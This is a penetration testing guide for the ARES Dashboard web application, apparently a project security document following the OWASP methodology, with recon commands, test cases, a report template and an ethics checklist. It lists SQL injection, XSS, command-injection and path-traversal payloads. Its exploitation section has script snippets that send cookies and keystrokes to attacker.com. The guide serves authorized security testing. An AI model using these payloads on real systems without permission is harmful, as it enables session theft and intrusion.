# Penetration Testing Guide

## Overview

This guide provides comprehensive procedures for conducting security assessments and penetration testing of ARES Dashboard.

## Testing Scope

### In-Scope Systems

- ✅ Web application (frontend and backend APIs)
- ✅ Authentication and authorization mechanisms
- ✅ Database layer (SQL injection, access controls)
- ✅ API endpoints and serverless functions
- ✅ Session management
- ✅ Input validation and sanitization
- ✅ File upload/download mechanisms
- ✅ Third-party integrations (OAuth, SAML)

### Out-of-Scope

- ❌ Physical security
- ❌ Social engineering (without explicit permission)
- ❌ Denial of Service attacks
- ❌ Infrastructure provider vulnerabilities (AWS, Vercel, etc.)
- ❌ Testing in production without approval

## Testing Methodology

We follow the OWASP Testing Guide v4 methodology:

1. **Information Gathering**
2. **Configuration and Deployment Management**
3. **Identity Management**
4. **Authentication**
5. **Authorization**
6. **Session Management**
7. **Input Validation**
8. **Error Handling**
9. **Cryptography**
10. **Business Logic**
11. **Client-Side**

## Phase 1: Reconnaissance

### 1.1 Passive Reconnaissance

**DNS enumeration:**

```bash
# Find subdomains
subfinder -d ares-dashboard.example.com

# DNS records
dig ares-dashboard.example.com ANY

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.ares-dashboard.example.com&output=json" | jq
```

**Technology fingerprinting:**

```bash
# Identify technologies
whatweb https://ares-dashboard.example.com

# Wappalyzer (browser extension)
# Check headers, cookies, scripts
```

**Public information gathering:**

```bash
# GitHub repository
gh repo view Arnoldlarry15/ARES-Dashboard

# Search for exposed secrets
trufflehog git https://github.com/Arnoldlarry15/ARES-Dashboard --only-verified

# Check for exposed .env files
curl https://ares-dashboard.example.com/.env
curl https://ares-dashboard.example.com/.env.local
```

### 1.2 Active Reconnaissance

**Port scanning:**

```bash
# Basic scan
nmap -sV -sC ares-dashboard.example.com

# Full scan
nmap -p- -A ares-dashboard.example.com
```

**Web server enumeration:**

```bash
# Directory enumeration
gobuster dir -u https://ares-dashboard.example.com \
  -w /usr/share/wordlists/dirb/common.txt

# API endpoint discovery
ffuf -w api-endpoints.txt \
  -u https://ares-dashboard.example.com/api/FUZZ
```

## Phase 2: Vulnerability Assessment

### 2.1 Authentication Testing

**Test cases:**

1. **Brute force protection**
   ```bash
   # Test rate limiting
   for i in {1..100}; do
     curl -X POST https://ares-dashboard.example.com/api/auth/login \
       -H "Content-Type: application/json" \
       -d '{"email":"test@example.com","password":"wrong"}' \
       -w "%{http_code}\n"
   done
   ```

2. **SQL injection in login**
   ```bash
   # Test payloads
   email=' OR '1'='1
   email=admin'--
   email=admin' OR 1=1--
   ```

3. **Password policy bypass**
   ```bash
   # Test weak passwords
   passwords=("123456" "password" "admin" "test")
   ```

4. **OAuth/SAML attacks**
   - CSRF in OAuth flow
   - Open redirect in callback
   - Token replay attacks
   - XML External Entity (XXE) in SAML

5. **Session fixation**
   ```bash
   # Check if session ID changes after login
   # Before login
   SESSION_BEFORE=$(curl -c - https://ares-dashboard.example.com | grep session)
   
   # After login
   SESSION_AFTER=$(curl -c - -X POST ... | grep session)
   ```

### 2.2 Authorization Testing

**Test cases:**

1. **Horizontal privilege escalation**
   ```bash
   # User A tries to access User B's campaigns
   curl https://ares-dashboard.example.com/api/campaigns/user_b_campaign_id \
     -H "Authorization: Bearer user_a_token"
   ```

2. **Vertical privilege escalation**
   ```bash
   # Viewer tries to perform admin actions
   curl -X DELETE https://ares-dashboard.example.com/api/users/123 \
     -H "Authorization: Bearer viewer_token"
   ```

3. **IDOR (Insecure Direct Object Reference)**
   ```bash
   # Sequential ID enumeration
   for id in {1..100}; do
     curl https://ares-dashboard.example.com/api/campaigns/$id \
       -H "Authorization: Bearer token"
   done
   ```

4. **Missing function level access control**
   ```bash
   # Access admin endpoints without admin role
   curl https://ares-dashboard.example.com/api/admin/users \
     -H "Authorization: Bearer analyst_token"
   ```

### 2.3 Input Validation Testing

**XSS (Cross-Site Scripting):**

```javascript
// Test payloads for campaign name field
const xssPayloads = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  'javascript:alert(1)',
  '<iframe src="javascript:alert(1)">',
  '"><script>alert(String.fromCharCode(88,83,83))</script>'
];

// Test each payload
xssPayloads.forEach(payload => {
  fetch('/api/campaigns', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: payload })
  });
});
```

**SQL Injection:**

```bash
# Test SQL injection in search
sqlmap -u "https://ares-dashboard.example.com/api/campaigns?search=test" \
  --cookie="session=..." \
  --batch \
  --level=5 \
  --risk=3
```

**NoSQL Injection:**

```bash
# Test MongoDB injection (if applicable)
curl -X POST https://ares-dashboard.example.com/api/campaigns \
  -H "Content-Type: application/json" \
  -d '{"name": {"$ne": null}}'
```

**Command Injection:**

```bash
# Test in file upload or processing
filename="; ls -la; #"
filename="| cat /etc/passwd"
filename="\`whoami\`"
```

**Path Traversal:**

```bash
# Test file download endpoints
curl https://ares-dashboard.example.com/api/files/../../etc/passwd
curl https://ares-dashboard.example.com/api/files/....//....//etc/passwd
```

### 2.4 Session Management Testing

**Test cases:**

1. **Session timeout**
   ```bash
   # Check if sessions expire
   # Login and wait
   sleep 3600
   curl https://ares-dashboard.example.com/api/campaigns \
     -H "Authorization: Bearer old_token"
   ```

2. **Session fixation**
   ```javascript
   // Check if session ID changes after login
   const sessionBefore = document.cookie;
   // Login
   const sessionAfter = document.cookie;
   console.log(sessionBefore === sessionAfter); // Should be false
   ```

3. **Concurrent sessions**
   ```bash
   # Login from multiple locations
   # Check if old sessions are invalidated
   ```

4. **Token exposure**
   ```bash
   # Check for tokens in:
   # - URLs
   # - Local storage
   # - Referer headers
   # - Browser history
   ```

### 2.5 Cryptography Testing

**Test cases:**

1. **Weak algorithms**
   ```bash
   # Check SSL/TLS configuration
   sslscan ares-dashboard.example.com
   testssl.sh ares-dashboard.example.com
   ```

2. **Insecure random number generation**
   ```javascript
   // Check if Math.random() is used for security
   // Should use crypto.randomBytes() or equivalent
   ```

3. **Password storage**
   ```sql
   -- Check password hashing (in test environment)
   SELECT password FROM users LIMIT 1;
   -- Should be bcrypt/argon2 hash, not plaintext or MD5
   ```

### 2.6 Business Logic Testing

**Test cases:**

1. **Race conditions**
   ```bash
   # Test concurrent campaign creation
   for i in {1..10}; do
     curl -X POST https://ares-dashboard.example.com/api/campaigns \
       -H "Authorization: Bearer token" \
       -H "Content-Type: application/json" \
       -d '{"name":"Test"}' &
   done
   ```

2. **Workflow bypass**
   ```bash
   # Try to skip required steps
   # Example: Export campaign before completing it
   curl -X POST https://ares-dashboard.example.com/api/campaigns/123/export \
     -H "Authorization: Bearer token"
   ```

3. **Parameter tampering**
   ```bash
   # Modify hidden parameters
   curl -X POST https://ares-dashboard.example.com/api/campaigns \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","role":"admin","price":0}'
   ```

## Phase 3: Exploitation

### 3.1 Exploitation Framework

**Use Burp Suite for manual testing:**

```
1. Configure browser to use Burp proxy (127.0.0.1:8080)
2. Browse application while Burp records traffic
3. Send requests to Repeater for modification
4. Use Intruder for automated fuzzing
5. Use Scanner for automated vulnerability detection
```

**Automated scanning with OWASP ZAP:**

```bash
# Active scan
zap-cli quick-scan -s xss,sqli \
  https://ares-dashboard.example.com

# Full scan
zap-cli active-scan \
  https://ares-dashboard.example.com
```

### 3.2 Exploitation Examples

**XSS exploitation:**

```javascript
// Steal session token
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Keylogger
<script>
  document.addEventListener('keypress', e => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>
```

**CSRF exploitation:**

```html
<!-- csrf-attack.html -->
<html>
  <body>
    <form id="csrf" method="POST" action="https://ares-dashboard.example.com/api/campaigns/123">
      <input type="hidden" name="action" value="delete">
    </form>
    <script>
      document.getElementById('csrf').submit();
    </script>
  </body>
</html>
```

**JWT attacks:**

```bash
# None algorithm attack
# Change "alg": "HS256" to "alg": "none"
# Remove signature

# Weak secret brute force
jwt-cracker <token> <wordlist>

# Kid parameter manipulation
# Change "kid" to "../../public/key.txt"
```

## Phase 4: Reporting

### 4.1 Vulnerability Severity

Use CVSS v3.1 scoring:

| Severity | CVSS Score | Examples |
|----------|-----------|----------|
| Critical | 9.0-10.0 | RCE, Authentication bypass |
| High | 7.0-8.9 | SQL injection, Privilege escalation |
| Medium | 4.0-6.9 | XSS, IDOR, Information disclosure |
| Low | 0.1-3.9 | Clickjacking, Missing headers |

### 4.2 Report Template

```markdown
# Penetration Test Report

## Executive Summary
- Test dates: [start] - [end]
- Scope: [systems tested]
- Methodology: OWASP Testing Guide v4
- Findings: X Critical, Y High, Z Medium, W Low

## Findings

### [1] SQL Injection in Campaign Search

**Severity:** High (CVSS 8.5)

**Description:**
The campaign search functionality is vulnerable to SQL injection, allowing 
attackers to execute arbitrary SQL commands.

**Impact:**
- Unauthorized data access
- Data manipulation
- Potential system compromise

**Affected Component:**
- Endpoint: GET /api/campaigns?search=
- Parameter: search

**Proof of Concept:**
```sql
GET /api/campaigns?search=' UNION SELECT * FROM users--
```

**Recommendation:**
1. Use parameterized queries
2. Implement input validation
3. Apply principle of least privilege to database user

**References:**
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html

---

### [2] Cross-Site Scripting (XSS) in Campaign Name

**Severity:** Medium (CVSS 6.1)

**Description:**
Campaign names are not properly sanitized, allowing stored XSS attacks.

**Impact:**
- Session hijacking
- Phishing attacks
- Malware distribution

**Proof of Concept:**
```javascript
<script>alert(document.cookie)</script>
```

**Recommendation:**
1. Implement output encoding
2. Use Content Security Policy
3. Sanitize user input

...
```

## Testing Tools

### Required Tools

1. **Burp Suite Professional** - Web application security testing
2. **OWASP ZAP** - Automated scanning
3. **SQLMap** - SQL injection exploitation
4. **Nikto** - Web server scanning
5. **Nmap** - Network scanning
6. **Metasploit** - Exploitation framework

### Optional Tools

- **Subfinder** - Subdomain enumeration
- **FFuF** - Web fuzzer
- **Nuclei** - Vulnerability scanner
- **JWT_Tool** - JWT manipulation
- **Postman** - API testing

## Checklist

### Pre-Test

- [ ] Get written authorization
- [ ] Define scope and rules of engagement
- [ ] Set up testing environment
- [ ] Install and configure tools
- [ ] Prepare test data and accounts

### During Test

- [ ] Information gathering
- [ ] Vulnerability scanning
- [ ] Manual testing
- [ ] Exploitation attempts
- [ ] Document findings
- [ ] Take screenshots/videos

### Post-Test

- [ ] Write detailed report
- [ ] Assign severity ratings
- [ ] Provide remediation recommendations
- [ ] Present findings to stakeholders
- [ ] Schedule retest

## Compliance Testing

### OWASP Top 10 (2021)

- [ ] A01:2021 - Broken Access Control
- [ ] A02:2021 - Cryptographic Failures
- [ ] A03:2021 - Injection
- [ ] A04:2021 - Insecure Design
- [ ] A05:2021 - Security Misconfiguration
- [ ] A06:2021 - Vulnerable and Outdated Components
- [ ] A07:2021 - Identification and Authentication Failures
- [ ] A08:2021 - Software and Data Integrity Failures
- [ ] A09:2021 - Security Logging and Monitoring Failures
- [ ] A10:2021 - Server-Side Request Forgery (SSRF)

### PCI DSS Requirements

- [ ] Requirement 6.5 - Secure coding practices
- [ ] Requirement 6.6 - Web application firewall
- [ ] Requirement 8 - Strong authentication
- [ ] Requirement 10 - Logging and monitoring

## Legal and Ethical Considerations

### Authorization

- ✅ Always get written permission
- ✅ Define scope clearly
- ✅ Follow rules of engagement
- ✅ Stop if unauthorized access occurs

### Data Handling

- ✅ Treat all discovered data as confidential
- ✅ Don't exfiltrate real customer data
- ✅ Use test accounts only
- ✅ Secure test results

### Responsible Disclosure

- ✅ Report findings immediately
- ✅ Don't publicly disclose without permission
- ✅ Allow reasonable time for fixes
- ✅ Coordinate disclosure timeline

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PTES Technical Guidelines](http://www.pentest-standard.org/index.php/Main_Page)
- [NIST SP 800-115](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-115.pdf)
- [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/)
